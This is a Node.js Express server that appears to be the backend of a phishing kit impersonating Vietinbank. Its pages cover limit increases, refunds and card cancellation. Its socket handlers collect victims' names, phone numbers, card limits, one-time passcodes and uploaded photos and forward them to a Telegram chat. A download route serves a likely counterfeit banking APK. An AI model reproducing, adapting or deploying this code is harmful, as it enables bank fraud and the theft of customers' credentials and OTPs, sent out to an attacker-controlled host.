require('dotenv').config();
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const http = require('http').createServer(app);
const { Server } = require('socket.io');
var cors = require('cors')
const io = new Server(http);
var siofu = require("socketio-file-upload");
const axios = require('axios');
const TG = require('telegram-bot-api')
const api = new TG({
    token: process.env.TELEGRAM_BOT_TOKEN
})
const fs = require('fs')

app.use(express.static('public'));
app.set('view engine', 'html');
app.set('views', './views');
app.use(cors({
    origin: '*'
}));
app.use(siofu.router).listen(process.env.PORT_UPLOAD || 3001);

io.on("connection", function (socket) {
    var uploader = new siofu();
    uploader.dir = "./public/uploads";
    uploader.listen(socket);
    uploader.on("saved", async function (event) {
        await api.sendPhoto({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
        });
    });
    socket.on('service', async (data) => {
        // send data to api telegram
        const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
        await api.sendMessage({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        })
        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
    });


    socket.on('otp', (data) => {
        // send data to api telegram
        const message = `Mã OTP: ${data.otp}`;
        api.sendMessage({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        }).then(() => {
            socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
        }).catch(() => {
            socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
        });

    });
});



app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/index.html');
});
app.get('/chuyen-tien-atm', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
})
app.get('/chuyen-tra-gop', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
});
app.get('/dang-ky-nang-cap', (req, res) => {
    res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
});
app.get('/hoan-tien', (req, res) => {
    res.sendFile(__dirname + '/views/hoan-tien.html');
});
app.get('/nang-han-muc', (req, res) => {
    res.sendFile(__dirname + '/views/nang-han-muc.html');
});
app.get('/otp', (req, res) => {
    res.sendFile(__dirname + '/views/otp.html');
});
app.get('/otp-error', (req, res) => {
    res.sendFile(__dirname + '/views/otp-error.html');
});
app.get('/yeu-cau-huy-the', (req, res) => {
    res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
});
app.get('/sang-ngang-the', (req, res) => {
    res.sendFile(__dirname + '/views/sang-ngang-the.html');
});
app.get('/download', function (req, res) {
    const file = `${__dirname}/public/app/Vietinbank_v3.10.13.apk`;
    res.download(file, 'Vietinbank_v3.10.13.apk', {
        cacheControl: false
    }, (err) => {
        console.log('err', err);
    }); // Set disposition and send it.
});
app.get('/download-app', function (req, res) {
    res.sendDate(__dirname + '/views/download-app.html');
});
// get all images
app.get('/images', function (req, res) {
    const path = `${__dirname}/public/uploads`;
    fs.readdir(path, function (err, items) {
        items.sort((a, b) => {
            const dateA = a.split('_')[1].split('-');
            const dateB = b.split('_')[1].split('-');
            if (dateA[0] > dateB[0]) return -1;
            if (dateA[0] < dateB[0]) return 1;
            if (dateA[1] > dateB[1]) return -1;
            if (dateA[1] < dateB[1]) return 1;
            if (dateA[2] > dateB[2]) return -1;
            if (dateA[2] < dateB[2]) return 1;
            return 0;
        });
        const images = items.map(item => {
            return `<img src="/uploads/${item}" width="100px" height="100px" />`;
        });
        res.send(images.join(''));
    });
});

http.listen(port, () => {
    console.log(`Đã chạy trên cổng :${port}`);
});
